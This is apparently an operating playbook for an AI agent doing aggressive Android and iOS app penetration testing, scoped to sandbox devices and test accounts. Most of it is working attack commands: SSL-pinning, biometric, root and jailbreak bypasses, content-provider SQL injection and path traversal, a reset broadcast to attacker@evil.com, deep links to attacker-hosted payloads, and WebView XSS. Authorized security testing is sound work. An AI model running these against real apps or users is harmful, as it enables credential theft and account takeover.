# Skill Playbook: mobile-app-agent — DEEP AGGRESSIVE MODE

> **Purpose:** Authoritative deep-aggressive-mode operating procedures for Android and iOS mobile application security testing. Every phase embeds skill-library technique chains from `skills/mobile-security/skill-playbook.md`, `skills/android/skill-playbook.md`, and `skills/mobile-security/ios-security.md`. Sandbox-only execution.

## Phase 1 — App Acquisition & Threat Modeling

1. **Acquire Binary** — Android: `adb shell pm list packages | grep -i target`, `adb shell pm path com.target.app`, `adb pull /data/app/com.target.app-*/base.apk target.apk`. iOS: `python3 dump.py com.target.app` (jailbroken device) or client-provided IPA.
2. **Technology Fingerprint** — Identify framework: `assets/index.android.bundle` (React Native), `libflutter.so` (Flutter), `UnityPlayerActivity` (Unity), `libapp.so` (Xamarin), Cordova `config.xml` (hybrid). This drives the toolchain.
3. **Threat Model (MASVS)** — Map the app to MASVS categories: DATA-STORAGE, CRYPTO, AUTH, NETWORK, PLATFORM, RESILIENCE. Note trust boundaries: device-server, app-to-app IPC, WebView-to-native.
4. **Manifest/Info.plist Triage** — `aapt2 dump xmltree target.apk AndroidManifest.xml | grep -iE "exported|debuggable|allowBackup|usesCleartextTraffic|permission"`; iOS `plutil -p Info.plist | grep -iE "CFBundleURLTypes|CFBundleURLSchemes"`. Flag every exported component and deep-link scheme.

## Phase 2 — Static Analysis (Decompilation & Source Review)

1. **Full Decompilation** — `apktool d target.apk -o apk_out/ -f` and `jadx -d jadx_out/ target.apk --deobf --show-bad-code`; `d2j-dex2jar target.apk -o target.jar`. iOS: `dsdump --objc ipa/Payload/*.app/TargetApp -o headers/`; `class-dump -H TargetApp -o headers_out/`.
2. **Secret Mining** — `grep -rniE "(api[_-]?key|secret|password|access[_-]?token|BEGIN.*PRIVATE KEY)" jadx_out/ apk_out/res/values/`; `apkleaks -f target.apk -p "api[_-]?key|secret|token|password|aws|BEGIN.*KEY" -o out.txt`; iOS `rabin2 -zzq binary | grep -iE "password|secret|api_key|token"`. Also mine `res/xml/network_security_config.xml` and `.env`/config JSON in assets.
3. **WebView Hunt** — `grep -rniE "addJavascriptInterface|setAllowFileAccess|@JavascriptInterface|invokeMethod|setJavaScriptEnabled" jadx_out/`. Any JS bridge is a high-value target.
4. **IPC & Deep Links** — `grep -rniE "getStringExtra|getIntExtra|getParcelableExtra|Intent.parseUri" apk_out/smali/`; catalog exported activities/services/receivers/providers and every `intent-filter` scheme+host.
5. **Crypto Review** — Hunt for ECB mode, static IVs, hardcoded keys, custom PRNGs, and base64-encoded credentials.
6. **ProGuard/R8 Assessment** — Check obfuscation quality; low obfuscation makes reverse engineering trivial.

## Phase 3 — SSL Pinning Bypass (skills/mobile-security/skill-playbook.md)

1. **Runtime Bypass (Android)** — `frida -U -f com.target.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass --no-pause`; `objection --gadget com.target.app explore --startup-command "android sslpinning disable"`.
2. **Runtime Bypass (iOS)** — Objection REPL: `ios sslpinning disable`; `frida-trace -U com.target.app -m "*[* *SecTrust*]" -m "*[* *URLSession*]"`.
3. **Custom TrustManager Hook** — Register a trust-all `X509TrustManager` and override `SSLContext.init`; also no-op `okhttp3.CertificatePinner.check`.
4. **Static Removal** — `apk-mitm target.apk` produces an unpinned rebuild for non-instrumented traffic capture.
5. **Verify** — Intercept and decrypt full HTTPS traffic in Burp with the tester CA installed as a system cert (Android) or trust profile (iOS). Capture raw auth tokens as evidence.

## Phase 4 — Exported Component Abuse (Android) (skills/android/skill-playbook.md)

1. **Attack Surface Map** — `drozer console connect; run app.package.attacksurface com.target.app`.
2. **Exported Activity** — `adb shell am start -n com.target.app/.AdminActivity`; `adb shell am start -n com.target.app/.ProfileActivity --es user_id 1337 --ez debug true`.
3. **Intent Injection / Redirection** — `adb shell am start -n com.target.app/.ProxyActivity --es redirect_intent 'intent:#Intent;component=com.target.app/.SensitiveActivity;S.extra=1;end'`; `adb shell am startservice -n com.target.app/.ExportedService --es redirect_intent 'intent:#Intent;component=com.target.app/.PrivService;action=com.target.DO;end'`.
4. **Content Provider Exploitation** — `adb shell cmd content query --uri content://com.target.app.provider/users`; projection SQLi `--projection "1) UNION SELECT username,password--"`; where-clause injection `--where "1=1) OR 1=1--"`; path traversal `adb shell cmd content read --uri content://com.target.app.provider/../../etc/passwd`; file provider escape `content://com.target.app.fileprovider/root/../databases/app.db`.
5. **Broadcast Abuse** — `adb shell am broadcast -a com.target.app.RESET_PASSWORD --es email attacker@evil.com`.
6. **Drozer Verification** — `run scanner.provider.injection -a com.target.app`; `run app.provider.query --uri content://... --projection password`.
7. **ADB Backup** — `adb backup -f backup.ab com.target.app`; extract with `(printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; dd if=backup.ab bs=1 skip=24) | tar xvzf -` when `allowBackup=true`.

## Phase 5 — Deep Link Hijacking & WebView Exploitation

1. **Deep Link Enumeration** — Extract schemes from the manifest: `aapt2 dump xmltree target.apk AndroidManifest.xml | grep -A5 intent-filter`; iOS `plutil -p Info.plist | grep -A5 CFBundleURLTypes`.
2. **Crafted URL Launch** — `adb shell am start -a android.intent.action.VIEW -d "myscheme://com.target.app/web?url=https://attacker.tld/payload.html"`; `adb shell am start -a android.intent.action.VIEW -d "intent:#Intent;package=com.target.app;scheme=myscheme;S.url=https://attacker.tld;end"`; iOS `xcrun simctl openurl booted 'myapp://web?url=https://attacker.tld/p'`.
3. **URL Open Redirect in WebView** — If the deep link passes a URL into a WebView, chain an attacker-controlled page into the WebView and execute JS.
4. **WebView JS Bridge Abuse** — After XSS or deep-link-to-WebView: enumerate `window` functions, then call bridge handlers to read files (e.g., `file:///data/data/<pkg>/app_webview/Default/Cookies`) where the bridge exposes file/base64 methods. Document bypass of `setAllowFileAccess(false)` if the bridge leaks file content.
5. **iOS Universal Links (AASA)** — Extract associated domains: `plutil -extract com.apple.developer.associated-domains`; fetch `https://$d/.well-known/apple-app-site-association` and audit for wildcards, over-broad paths, and broken exclude ordering.
6. **WebView/JS Bridge PoC** — `adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror=alert(1)>'`; confirm JS executes in the native WebView context.

## Phase 6 — iOS Objection & Keychain Analysis (skills/mobile-security/ios-security.md)

1. **Environment Setup** — `ssh root@<device> "/usr/sbin/frida-server -D"`; `objection patchipa --source target.ipa --codesign-signature "Apple Development: team@example.com"`; `ideviceinstaller -i target-patched.ipa`; `iproxy 2222 22`.
2. **FairPlay Decryption** — `python3 dump.py com.target.app`; `bagbak --raw TargetApp`; confirm `otool -l TargetApp | grep -A 4 LC_ENCRYPTION_INFO` shows cryptid 0.
3. **Objection REPL** — `objection --gadget com.target.app explore`: `ios keychain dump`; `ios nsuserdefaults get`; `ios plist cat Info.plist`; `ios file cat <path>`; `sqlite connect app_data.db; sqlite execute query "SELECT * FROM accounts"`; `ios pasteboard monitor`; `ios hooking search classes Auth`; `ios hooking search methods token`.
4. **Insecure Storage Inventory** — Keychain items, NSUserDefaults plists, Realm `.realm`, SQLite DBs, CoreData stores, and log files. Record token/credential plaintext exposure.
5. **Biometric Bypass** — Frida hook on `LAContext -canEvaluatePolicy:error:` (return true) and `-evaluatePolicy:localizedReason:reply:` (fire reply success block); reproduce on local test account.
6. **Jailbreak Detection Bypass** — `ios jailbreak disable`; custom Frida hooking `NSFileManager -fileExistsAtPath:` to hide Cydia/sshd/apt paths; `ios jailbreak simulate`.
7. **Privacy Permission Abuse** — `rabin2 -zzq binary | grep -iE "CLContactStore|AVCaptureDevice|CLLocation|PHPhotoLibrary"`; document over-collection.

## Phase 7 — Root/Emulator Detection Bypass & Repackaging

1. **Root Detection Bypass** — `objection --gadget com.target.app explore --startup-command "android root disable"`; custom Frida scripts hooking `su` path checks, `PackageManager` signature checks, and Magisk detection.
2. **Smali Patching** — `apktool d target.apk -o patch/ -f`; flip boolean checks (`const/4 v0, 0x0 -> const/4 v0, 0x1`); `apktool b patch/ -o patched.apk`; `keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000`; `apksigner sign --ks test.keystore --out patched-signed.apk patched.apk`; `apksigner verify --verbose patched-signed.apk`; `adb install patched-signed.apk` (sandbox device only).
3. **Signature Verification Bypass** — v1-only apps: drop `META-INF/*.SF|.RSA|.MF`, re-sign, reinstall. Otherwise Frida-hook the `signatures` comparison to return the original signature.
4. **Anti-Debug Bypass** — Frida-hook `ptrace`, `TracerPid` reads, and timing checks; document the effort each defense adds.
5. **Tamper Detection Assessment** — Determine whether checksum/reflection-based tamper checks survive a smali patch and re-sign; quantify bypass time.

## Phase 8 — Network Traffic Analysis & API Testing

1. **Proxy Setup** — Burp on 127.0.0.1:8080; install tester CA as system cert (`adb root && adb remount; adb push cacert.cer /system/etc/security/cacerts/<hash>.0; adb shell chmod 644 ... && adb reboot`) or iOS trust profile.
2. **Traffic Map** — Enumerate all API endpoints, headers, tokens, and device fingerprint data; flag endpoints the web app does not use.
3. **Mobile API Auth Testing** — `jwt_tool <token> -X a` (alg none); decode payloads for role/scope claims; probe BOLA on `/api/v1/users/{id}` style endpoints; OAuth `redirect_uri` hijack via claimable `myapp://callback` schemes.
4. **Request Manipulation** — Replay and modify captured requests in Burp Repeater for server-side flaws (IDOR, injection, mass assignment); hand findings to api-testing-agent.

## Phase 9 — Evasion & Deep Aggressive Execution

1. **Stealth on Device** — Disable/relocate frida-server to evade basic detection; use spawn vs attach modes to bypass anti-debug.
2. **Frida Instrumentation Depth** — `frida-trace -U -f com.target.app -i open -i read -i write -i connect -i execve` for filesystem/network call tracing; hook crypto functions (`javax.crypto`, `CommonCrypto`) and storage APIs to log data flows.
3. **Chain Verification** — Combine IPC abuse -> deep link -> WebView JS -> file read, and storage theft -> API BOLA -> account takeover; reproduce each step independently with two tools (adb + drozer, Objection + Frida).
4. **Coverage Gate** — Before closing an app: static decompile complete, secrets mined, pinning bypass proven with Burp capture, exported components tested, providers injection-tested, deep links hijacked, WebView bridge assessed, iOS keychain/prefs inspected, repackaging tested, traffic fully mapped.

## Phase 10 — Verification & Evidence

1. **Sandbox Isolation** — Emulator or dedicated rooted/jailbroken test device; Burp/mitmproxy with tester-controlled CA only.
2. **Static + Dynamic Cross-Check** — Every finding reproduced twice: static evidence (code/string location) and dynamic evidence (Frida hook, adb output, Objection REPL transcript).
3. **No Production Data** — BOLA tested against staging API with dedicated test users; no real user data accessed via providers/backups/keychains.
4. **Severity** — Validate against CVSS v4.0 and MASVS categories.
5. **Cleanup** — Remove patched apps, restore device state, delete extracted data from attacker-controlled storage.
6. **Handoff** — Findings YAML with MASVS/Mobile Top 10 mapping, static+dynamic evidence, and PoC commands; hardcoded credentials to secrets-scanning-agent/vault-agent (encrypted); server-side API findings to api-testing-agent.
